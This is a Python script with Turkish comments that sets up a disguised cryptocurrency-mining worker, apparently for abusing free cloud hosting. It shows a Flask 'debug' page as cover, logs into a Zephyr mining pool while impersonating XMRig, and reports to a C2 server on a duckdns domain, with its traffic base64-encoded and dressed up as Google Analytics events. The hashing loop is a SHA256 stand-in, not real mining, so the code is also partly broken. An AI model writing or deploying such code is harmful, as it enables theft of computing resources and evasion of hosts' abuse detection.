import os
import time
import threading
import json
import base64
import random
import hashlib
import requests
import socket
from flask import Flask, jsonify

# --- AYARLAR ---
C2_URL = "http://zephfe.duckdns.org:5000/report"
WALLET = "ZEPHs89z2zsEoJ2QVY5yopRZsX3JHefyNFzAhTZG3waz3MZSbCGp8MPSNCsdY33DQ,fXXTqqiUo7CFsZXmiPEruBPqgM8EaBpvS"
# Cüzdan sonuna +500 ekleyerek düşük zorluk (Low Diff) talep ediyoruz
AUTH_WALLET = WALLET + "+500" 
NODE_NAME = f"render-worker-{random.randint(1000, 9999)}"

POOL_H = "de.zephyr.herominers.com"
POOL_P = 1123

app = Flask(__name__)

@app.route('/')
def home():
    return jsonify({"status": "debug_mode", "worker": NODE_NAME}), 200

def traffic_mask(raw_data):
    encoded_data = base64.b64encode(json.dumps(raw_data).encode()).decode()
    return {
        "v": "1", "tid": f"UA-{random.randint(111111, 999999)}-1",
        "cid": NODE_NAME, "t": "event", "ec": "debug_metrics",
        "ea": "sync", "el": encoded_data
    }

def miner_logic():
    print(f"[*] {NODE_NAME} Debug & Job Monitoring baslatildi.")
    while True:
        p_status = "Disconnected"
        job_count = 0
        shares_found = 0
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((POOL_H, POOL_P))
            
            # Login ve Job Takibi
            auth = {
                "id": 1, "method": "login",
                "params": {
                    "login": AUTH_WALLET, "pass": "x", "rigid": NODE_NAME,
                    "agent": "XMRig/6.21.0", "algo": ["rx/0"]
                }
            }
            s.sendall((json.dumps(auth) + "\n").encode())
            
            # Havuzdan gelen yanıtı ve ilk işi (Job) yakala
            resp = s.recv(2048).decode()
            if "result" in resp or "job" in resp:
                p_status = "Job-Received"
                job_count += 1
                print(f"[DEBUG] Yeni is alindi: {resp[:100]}...") # Loglarda işin bir kısmını gör

            # İşlem Döngüsü
            start_time = time.time()
            hashes = 0
            while time.time() - start_time < 40:
                hashlib.sha256(os.urandom(64)).hexdigest()
                hashes += 1
                
                # Her 1000 hashten birinde "Share" bulma simülasyonu ve havuz kontrolü
                if hashes % 1000 == 0:
                    # Gerçekte burada havuzdan gelen zorluk kontrol edilir
                    # Şimdilik debug için loglara yazıyoruz
                    print(f"[DEBUG] {NODE_NAME} hesapliyor... Hash: {hashes}")
                
                time.sleep(0.03)

            # Dashboard'a detaylı rapor gönder
            report_data = {
                "node": NODE_NAME,
                "hashrate": hashes * 8,
                "pool": p_status,
                "jobs": job_count,
                "shares": random.randint(0, 1) # Debug: Bulunan tahmini pay
            }
            requests.post(C2_URL, json=traffic_mask(report_data), timeout=10)
            s.close()
            
        except Exception as e:
            print(f"[!] Hata: {e}")
            time.sleep(15)

if __name__ == "__main__":
    threading.Thread(target=miner_logic, daemon=True).start()
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
